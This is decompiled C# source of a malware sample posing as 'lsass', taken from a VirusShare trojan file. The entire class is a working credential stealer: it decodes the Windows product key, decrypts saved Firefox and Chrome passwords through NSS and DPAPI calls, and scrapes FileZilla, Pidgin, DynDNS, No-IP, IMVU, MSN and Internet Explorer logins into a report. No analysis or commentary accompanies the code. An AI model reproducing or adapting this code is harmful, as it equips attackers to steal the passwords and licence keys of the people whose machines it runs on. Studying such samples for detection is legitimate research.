// Decompiled with JetBrains decompiler
// Type: bMMYs49
// Assembly: lsass, Version=3.6.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3502A8EC-2162-44B8-AC38-178A4CFA2FF6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00020-msil\Trojan-Ransom.Win32.Foreign.nbpi-75632fb409b023ebac1886a858652fa8e8b29be753abebf0ee9bc896fdb5d961.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using OhWqs0;
using System;
using System.Collections;
using System.Data;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using YAB3Y5;

public class bMMYs49
{
  private IemjJ6HCPPS18 \u0033xSVt181;
  private static IntPtr NSS3;
  public static string signon;
  private wL9QjUqiyds6 eiJKW182;

  public bMMYs49()
  {
    this.\u0033xSVt181 = new IemjJ6HCPPS18();
    this.eiJKW182 = new wL9QjUqiyds6();
  }

  public string pA59X217()
  {
    string str1 = "";
    string Left = (string) null;
    try
    {
      byte[] sourceArray = (byte[]) NinPNCzNBJC2.Computer.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion", false).GetValue("DigitalProductId");
      byte[] destinationArray = new byte[15];
      Array.Copy((Array) sourceArray, 52, (Array) destinationArray, 0, 15);
      string str2 = "BCDFGHJKMPQRTVWXY2346789";
      int num1 = 0;
      do
      {
        short startIndex = 0;
        int index = 14;
        do
        {
          short num2 = checked ((short) ((int) startIndex * 256 ^ (int) destinationArray[index]));
          destinationArray[index] = checked ((byte) Math.Round(Conversion.Int(unchecked ((double) num2 / 24.0))));
          startIndex = checked ((short) unchecked ((int) num2 % 24));
          checked { index += -1; }
        }
        while (index >= 0);
        str1 = str2.Substring((int) startIndex, 1) + str1;
        checked { ++num1; }
      }
      while (num1 <= 24);
      int num3 = 4;
      do
      {
        str1 = str1.Insert(checked (num3 * 5), "-");
        checked { num3 += -1; }
      }
      while (num3 >= 1);
      Left = Left + str1 + "\r\n";
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ Windows Key ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  [DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
  private static extern IntPtr \u0034cfdl218(string dllFilePath);

  [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr LFnXT219(IntPtr hModule, string procName);

  public static long \u00332lEe220(string configdir)
  {
    bMMYs49.\u0034cfdl218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\mozcrt19.dll");
    bMMYs49.\u0034cfdl218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nspr4.dll");
    bMMYs49.\u0034cfdl218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\plc4.dll");
    bMMYs49.\u0034cfdl218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\plds4.dll");
    bMMYs49.\u0034cfdl218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\ssutil3.dll");
    bMMYs49.\u0034cfdl218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\sqlite3.dll");
    bMMYs49.\u0034cfdl218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nssutil3.dll");
    bMMYs49.\u0034cfdl218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\softokn3.dll");
    bMMYs49.NSS3 = bMMYs49.\u0034cfdl218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nss3.dll");
    return ((bMMYs49.AxkcB52) Marshal.GetDelegateForFunctionPointer(bMMYs49.LFnXT219(bMMYs49.NSS3, "NSS_Init"), typeof (bMMYs49.AxkcB52)))(configdir);
  }

  public static long e23x5221() => ((bMMYs49.ZUNga53) Marshal.GetDelegateForFunctionPointer(bMMYs49.LFnXT219(bMMYs49.NSS3, "PK11_GetInternalKeySlot"), typeof (bMMYs49.ZUNga53)))();

  public static long bv9pi222(long slot, bool loadCerts, long wincx) => ((bMMYs49.SADiL54) Marshal.GetDelegateForFunctionPointer(bMMYs49.LFnXT219(bMMYs49.NSS3, "PK11_Authenticate"), typeof (bMMYs49.SADiL54)))(slot, loadCerts, wincx);

  public static int VlfLc223(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen) => ((bMMYs49.laVfm55) Marshal.GetDelegateForFunctionPointer(bMMYs49.LFnXT219(bMMYs49.NSS3, "NSSBase64_DecodeBuffer"), typeof (bMMYs49.laVfm55)))(arenaOpt, outItemOpt, inStr, inLen);

  public static int pBTu9224(ref bMMYs49.oi7Tu51 data, ref bMMYs49.oi7Tu51 result, int cx) => ((bMMYs49.\u0032F2Hf56) Marshal.GetDelegateForFunctionPointer(bMMYs49.LFnXT219(bMMYs49.NSS3, "PK11SDR_Decrypt"), typeof (bMMYs49.\u0032F2Hf56)))(ref data, ref result, cx);

  public string ofH5S225()
  {
    string Left = (string) null;
    try
    {
      bool flag = false;
      string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
      int index1 = 0;
      while (index1 < directories.Length)
      {
        string str = directories[index1];
        if (!flag)
        {
          string[] files = Directory.GetFiles(str);
          int index2 = 0;
          while (index2 < files.Length)
          {
            string input = files[index2];
            if (!flag)
            {
              if (Regex.IsMatch(input, "signons.sqlite"))
              {
                bMMYs49.\u00332lEe220(str);
                bMMYs49.signon = input;
              }
              checked { ++index2; }
            }
            else
              break;
          }
          checked { ++index1; }
        }
        else
          break;
      }
      string signon = bMMYs49.signon;
      bMMYs49.oi7Tu51 oi7Tu51_1 = new bMMYs49.oi7Tu51();
      bMMYs49.oi7Tu51 result1 = new bMMYs49.oi7Tu51();
      bMMYs49.oi7Tu51 result2 = new bMMYs49.oi7Tu51();
      DataTable dataTable = new kvsA360(signon).Vw5kp262("SELECT * FROM moz_logins;");
      bMMYs49.bv9pi222(bMMYs49.e23x5221(), true, 0L);
      try
      {
        foreach (DataRow row in dataTable.Rows)
        {
          string str = Convert.ToString(row["formSubmitURL"].ToString());
          Left = Left + "URL: " + str + "\r\n";
          StringBuilder inStr1 = new StringBuilder(row["encryptedUsername"].ToString());
          IntPtr num = new IntPtr(bMMYs49.VlfLc223(IntPtr.Zero, IntPtr.Zero, inStr1, inStr1.Length));
          object structure1 = Marshal.PtrToStructure(num, typeof (bMMYs49.oi7Tu51));
          bMMYs49.oi7Tu51 oi7Tu51_2;
          bMMYs49.oi7Tu51 data1 = structure1 != null ? (bMMYs49.oi7Tu51) structure1 : oi7Tu51_2;
          if (bMMYs49.pBTu9224(ref data1, ref result1, 0) == 0 && result1.SECItemLen != 0)
          {
            byte[] numArray = new byte[checked (result1.SECItemLen - 1 + 1)];
            num = new IntPtr(result1.SECItemData);
            Marshal.Copy(num, numArray, 0, result1.SECItemLen);
            Left = Left + "USER: " + Encoding.ASCII.GetString(numArray) + "\r\n";
          }
          StringBuilder inStr2 = new StringBuilder(row["encryptedPassword"].ToString());
          num = new IntPtr(bMMYs49.VlfLc223(IntPtr.Zero, IntPtr.Zero, inStr2, inStr2.Length));
          object structure2 = Marshal.PtrToStructure(num, typeof (bMMYs49.oi7Tu51));
          bMMYs49.oi7Tu51 data2 = structure2 != null ? (bMMYs49.oi7Tu51) structure2 : oi7Tu51_2;
          if (bMMYs49.pBTu9224(ref data2, ref result2, 0) == 0 && result2.SECItemLen != 0)
          {
            byte[] numArray = new byte[checked (result2.SECItemLen - 1 + 1)];
            num = new IntPtr(result2.SECItemData);
            Marshal.Copy(num, numArray, 0, result2.SECItemLen);
            Left = Left + "PASSWORD: " + Encoding.ASCII.GetString(numArray) + "\r\n";
          }
          Left += "\r\n";
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      Left += "\r\n";
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ FireFox 3.5+ ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  public string XTbpi226()
  {
    string Left1 = (string) null;
    try
    {
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Web Data";
      if (File.Exists(str1))
      {
        DataTable dataTable = new kvsA360(str1).Vw5kp262("SELECT * FROM logins;");
        try
        {
          foreach (DataRow row in dataTable.Rows)
          {
            string str2 = Convert.ToString(row["origin_url"].ToString());
            string Left2 = Convert.ToString(row["username_value"].ToString());
            string Left3 = bMMYs49.nwx3L228((byte[]) row["password_value"]);
            if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left2, "", false) != 0 & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left3, "", false) != 0)
            {
              string str3 = "Host: " + str2 + "\r\nUser: " + Left2 + "\r\nPassword: " + Left3 + "\r\n\r\n";
              Left1 += str3;
            }
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left1, (string) null, false) != 0)
      Left1 = "--------------------------------------------------------------------------------------\r\n[ Chrome ]\r\n--------------------------------------------------------------------------------------\r\n" + Left1 + "\r\n";
    return Left1;
  }

  [DllImport("Crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern bool \u0038r7Je227(
    ref bMMYs49.wdFjt59 pDataIn,
    string szDataDescr,
    ref bMMYs49.wdFjt59 pOptionalEntropy,
    IntPtr pvReserved,
    ref bMMYs49.HtJoE58 pPromptStruct,
    int dwFlags,
    ref bMMYs49.wdFjt59 pDataOut);

  public static string nwx3L228(byte[] Datas)
  {
    bMMYs49.wdFjt59 wdFjt59_1 = new bMMYs49.wdFjt59();
    bMMYs49.wdFjt59 wdFjt59_2 = new bMMYs49.wdFjt59();
    GCHandle gcHandle = GCHandle.Alloc((object) Datas, GCHandleType.Pinned);
    wdFjt59_1.pbData = gcHandle.AddrOfPinnedObject();
    wdFjt59_1.cbData = Datas.Length;
    gcHandle.Free();
    ref bMMYs49.wdFjt59 local1 = ref wdFjt59_1;
    bMMYs49.wdFjt59 wdFjt59_3;
    bMMYs49.wdFjt59 wdFjt59_4 = wdFjt59_3;
    ref bMMYs49.wdFjt59 local2 = ref wdFjt59_4;
    IntPtr num;
    IntPtr pvReserved = num;
    bMMYs49.HtJoE58 htJoE58_1;
    bMMYs49.HtJoE58 htJoE58_2 = htJoE58_1;
    ref bMMYs49.HtJoE58 local3 = ref htJoE58_2;
    ref bMMYs49.wdFjt59 local4 = ref wdFjt59_2;
    bMMYs49.\u0038r7Je227(ref local1, (string) null, ref local2, pvReserved, ref local3, 0, ref local4);
    byte[] numArray = new byte[checked (wdFjt59_2.cbData + 1)];
    Marshal.Copy(wdFjt59_2.pbData, numArray, 0, wdFjt59_2.cbData);
    string str = Encoding.Default.GetString(numArray);
    return str.Substring(0, checked (str.Length - 1));
  }

  public string y2QUq229()
  {
    string Left = (string) null;
    try
    {
      string[] strArray1 = NinPNCzNBJC2.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml").Split('\r');
      int index1 = 0;
      while (index1 < strArray1.Length)
      {
        string str = strArray1[index1];
        if (str.Contains("<Host>"))
          Left = Left + "Host: " + str.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") + Environment.NewLine;
        if (str.Contains("<Port>"))
          Left = Left + ":" + str.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + Environment.NewLine;
        if (str.Contains("<User>"))
          Left = Left + "User: " + str.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") + Environment.NewLine;
        if (str.Contains("<Pass>"))
          Left = Left + "Pass: " + str.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + Environment.NewLine + Environment.NewLine;
        checked { ++index1; }
      }
      Left += "\r\n";
      string[] strArray2 = NinPNCzNBJC2.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml").Split('\r');
      int index2 = 0;
      while (index2 < strArray2.Length)
      {
        string str = strArray2[index2];
        if (str.Contains("<Host>"))
          Left = Left + "Host: " + str.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") + Environment.NewLine;
        if (str.Contains("<Port>"))
          Left = Left + ":" + str.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + Environment.NewLine;
        if (str.Contains("<User>"))
          Left = Left + "User: " + str.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") + Environment.NewLine;
        if (str.Contains("<Pass>"))
          Left = Left + "Pass: " + str.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + Environment.NewLine + Environment.NewLine;
        checked { ++index2; }
      }
      Left += "\r\n";
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ FileZilla ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  public string qpBLt230()
  {
    string Left1 = (string) null;
    try
    {
      string Left2 = Conversions.ToString(NinPNCzNBJC2.Computer.Registry.GetValue("HKEY_CURRENT_USER\\Software\\IMVU", "username", (object) null));
      string str = Conversions.ToString(NinPNCzNBJC2.Computer.Registry.GetValue("HKEY_CURRENT_USER\\Software\\IMVU", "password", (object) null));
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left2, "", false) != 0 & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(str, "", false) != 0)
      {
        Left1 = Left1 + "\r\nUsername : " + Left2 + "\r\nPassword : " + this.s8QuQ231(str);
        Left1 += "\r\n";
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left1, (string) null, false) != 0)
      Left1 = "--------------------------------------------------------------------------------------\r\n[ IMVU ]\r\n--------------------------------------------------------------------------------------\r\n" + Left1 + "\r\n";
    return Left1;
  }

  public string s8QuQ231(string Text)
  {
    string str;
    try
    {
      object Left = (object) null;
      object Counter;
      object LoopForResult;
      object CounterResult;
      if (ObjectFlowControl.ForLoopControl.ForLoopInitObj(Counter, (object) 1, (object) Strings.Len(Text), (object) 1, ref LoopForResult, ref CounterResult))
      {
        do
        {
          object Right = (object) Strings.Mid(Text, Conversions.ToInteger(CounterResult), 2);
          Left = Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Left, (object) Strings.Chr(checked ((int) Math.Round(Conversion.Val(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject((object) "&h", Right))))));
          CounterResult = Microsoft.VisualBasic.CompilerServices.Operators.AddObject(CounterResult, (object) 1);
        }
        while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
      }
      str = Conversions.ToString(Left);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = (string) null;
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public string ZkYF8232(string data)
  {
    string str;
    try
    {
      Decoder decoder = new UTF8Encoding().GetDecoder();
      byte[] bytes = Convert.FromBase64String(data);
      char[] chars = new char[checked (decoder.GetCharCount(bytes, 0, bytes.Length) - 1 + 1)];
      decoder.GetChars(bytes, 0, bytes.Length, chars, 0);
      str = new string(chars);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = (string) null;
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public string hkJ6a233()
  {
    string Left1 = (string) null;
    try
    {
      string Left2 = Conversions.ToString(NinPNCzNBJC2.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", (object) null));
      string str1 = Conversions.ToString(NinPNCzNBJC2.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", (object) null));
      string str2 = Conversions.ToString(NinPNCzNBJC2.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyUsername", (object) null));
      string data = Conversions.ToString(NinPNCzNBJC2.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPassword", (object) null));
      string str3 = Conversions.ToString(NinPNCzNBJC2.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPort", (object) null));
      string str4 = "\r\n";
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left2, "", false) != 0 & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(str1, "", false) != 0)
      {
        Left1 = Left1 + "Username: " + Left2 + str4 + "Password: " + this.ZkYF8232(str1) + str4 + "Proxy Username:" + str2 + str4 + "Proxy Password: " + this.ZkYF8232(data) + str4 + "Proxy Port: " + str3 + str4 + str4;
        Left1 += "\r\n";
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left1, (string) null, false) != 0)
      Left1 = "--------------------------------------------------------------------------------------\r\n[ No IP ]\r\n--------------------------------------------------------------------------------------\r\n" + Left1 + "\r\n";
    return Left1;
  }

  public string tdvxO234()
  {
    string Left1 = (string) null;
    try
    {
      string Left2 = (string) null;
      string str1 = (string) null;
      string sDest = (string) null;
      string[] strArray = NinPNCzNBJC2.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\DynDNS\\Updater\\config.dyndns").Split('\r');
      int index = 0;
      while (index < strArray.Length)
      {
        string str2 = strArray[index];
        if (str2.Contains("Username="))
          Left2 = Strings.Mid(str2, 11);
        else if (str2.Contains("Password="))
          str1 = Strings.Mid(str2, 11);
        checked { ++index; }
      }
      int num1 = Strings.Len(str1);
      int Start = 1;
      while (Start <= num1)
      {
        sDest += Conversions.ToString(Strings.Chr(checked ((int) Math.Round(Conversion.Val("&H" + Strings.Mid(str1, Start, 2))))));
        checked { Start += 2; }
      }
      int num2 = Strings.Len(sDest);
      int num3 = 1;
      while (num3 <= num2)
      {
        int num4;
        StringType.MidStmtStr(ref sDest, num3, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(sDest, num3, 1)) ^ Strings.Asc(Strings.Mid("t6KzXhCh", checked (num4 + 1), 1)))));
        num4 = checked (num4 + 1) % 8;
        checked { ++num3; }
      }
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left2, "", false) != 0 & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(sDest, "", false) != 0)
      {
        Left1 = Left1 + "User: " + Left2 + "\r\nPassword: " + sDest + "\r\n";
        Left1 += "\r\n";
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left1, (string) null, false) != 0)
      Left1 = "--------------------------------------------------------------------------------------\r\n[ DynDNS ]\r\n--------------------------------------------------------------------------------------\r\n" + Left1 + "\r\n";
    return Left1;
  }

  public string S3QIB235()
  {
    string Left = (string) null;
    try
    {
      string file = Interaction.Environ("APPDATA") + "\\.purple\\accounts.xml";
      string str1 = Conversions.ToString(1);
      string str2 = "\r\n";
      string end = NinPNCzNBJC2.Computer.FileSystem.OpenTextFileReader(file).ReadToEnd();
      string str3 = (string) null;
      string[] strArray1 = end.Split('\r');
      str1 = (string) null;
      string[] strArray2 = strArray1;
      int index = 0;
      while (index < strArray2.Length)
      {
        string str4 = strArray2[index];
        if (str4.Contains("<protocol>"))
          str3 = str3 + "Protocol:" + str4 + str2;
        if (str4.Contains("<name>"))
          str3 = str3 + "Name:" + str4 + str2;
        if (str4.Contains("<password>"))
          str3 = str3 + "Password:" + str4 + str2 + str2;
        checked { ++index; }
      }
      Left += str3;
      Left += "\r\n";
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ Pidgin ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  public string loNEs236()
  {
    string Left = (string) null;
    try
    {
      try
      {
        foreach (DSzfEWrg8jh17 dszfEwrg8jh17 in this.\u0033xSVt181)
        {
          Left = Left + "Login: " + dszfEwrg8jh17.Login + "\r\n";
          Left = Left + "Password: " + dszfEwrg8jh17.Password + "\r\n\r\n";
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ MSN - Live Messenger ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  public string xipWQ237()
  {
    string Left = (string) null;
    try
    {
      bool flag = false;
      string str1 = Conversions.ToString(1);
      string file = (string) null;
      string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
      int index1 = 0;
      while (index1 < directories.Length)
      {
        string path = directories[index1];
        if (!flag)
        {
          string[] files = Directory.GetFiles(path);
          int index2 = 0;
          while (index2 < files.Length)
          {
            string input = files[index2];
            if (!flag)
            {
              if (Regex.IsMatch(input, "signons3.txt"))
                file = input;
              checked { ++index2; }
            }
            else
              break;
          }
          checked { ++index1; }
        }
        else
          break;
      }
      string[] strArray1 = NinPNCzNBJC2.Computer.FileSystem.OpenTextFileReader(file).ReadToEnd().Split('\r');
      str1 = (string) null;
      bMMYs49.oi7Tu51 result = new bMMYs49.oi7Tu51();
      string[] strArray2 = strArray1;
      int index3 = 0;
      while (index3 < strArray2.Length)
      {
        string str2 = strArray2[index3];
        if (str2.Length != 0 & str2.StartsWith(".") & !str2.StartsWith("#"))
          Left += "\r\n";
        else if (str2.StartsWith("http") | str2.Contains("//") | str2.Contains("ftp."))
          Left = Left + "URL: " + str2 + "\r\n";
        else if (str2.ToLower().Contains("username") | str2.ToLower().Contains("login") | str2.ToLower().Contains("email"))
          Left += "User: ";
        else if (str2.Contains("*"))
          Left += "Password: ";
        else if (str2.Contains("AAAAAAAAA"))
        {
          StringBuilder inStr = new StringBuilder(str2);
          IntPtr num = new IntPtr(bMMYs49.VlfLc223(IntPtr.Zero, IntPtr.Zero, inStr, inStr.Length));
          object structure = Marshal.PtrToStructure(num, typeof (bMMYs49.oi7Tu51));
          bMMYs49.oi7Tu51 oi7Tu51;
          bMMYs49.oi7Tu51 data = structure != null ? (bMMYs49.oi7Tu51) structure : oi7Tu51;
          if (bMMYs49.pBTu9224(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
          {
            byte[] numArray = new byte[checked (result.SECItemLen - 1 + 1)];
            num = new IntPtr(result.SECItemData);
            Marshal.Copy(num, numArray, 0, result.SECItemLen);
            Left = Left + Encoding.ASCII.GetString(numArray) + "\r\n";
          }
        }
        else if (str2.Contains("---"))
          Left += "\r\n";
        checked { ++index3; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ FireFox 2-3 ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  public string \u0030ADSe238()
  {
    string Left = (string) null;
    try
    {
      try
      {
        foreach (object obj in this.eiJKW182)
        {
          object objectValue = RuntimeHelpers.GetObjectValue(obj);
          if (Conversions.ToBoolean(Microsoft.VisualBasic.CompilerServices.Operators.NotObject(Microsoft.VisualBasic.CompilerServices.Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type) null, "Password", new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) "", false))))
          {
            Left = Conversions.ToString(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject((object) (Left + "URL: "), NewLateBinding.LateGet(objectValue, (Type) null, "URL", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (object) "\r\n"));
            Left = Conversions.ToString(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject((object) (Left + "Username: "), NewLateBinding.LateGet(objectValue, (Type) null, "UserName", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (object) "\r\n"));
            Left = Conversions.ToString(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject((object) (Left + "Password: "), NewLateBinding.LateGet(objectValue, (Type) null, "Password", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (object) "\r\n"), (object) "\r\n"));
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ Internet Explorer 7-8 ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate int \u0032F2Hf56(ref bMMYs49.oi7Tu51 data, ref bMMYs49.oi7Tu51 result, int cx);

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate long AxkcB52(string configdir);

  public class cU3XA50
  {
    public static long cb;
    public static byte[] abID;
  }

  [Flags]
  public enum Deslr57
  {
    CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
    CRYPTPROTECT_PROMPT_ON_PROTECT = 2,
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public struct HtJoE58
  {
    public int cbSize;
    public bMMYs49.Deslr57 dwPromptFlags;
    public IntPtr hwndApp;
    public string szPrompt;
  }

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate int laVfm55(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

  public struct oi7Tu51
  {
    public int SECItemType;
    public int SECItemData;
    public int SECItemLen;
  }

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate long SADiL54(long slot, bool loadCerts, long wincx);

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public struct wdFjt59
  {
    public int cbData;
    public IntPtr pbData;
  }

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate long ZUNga53();
}
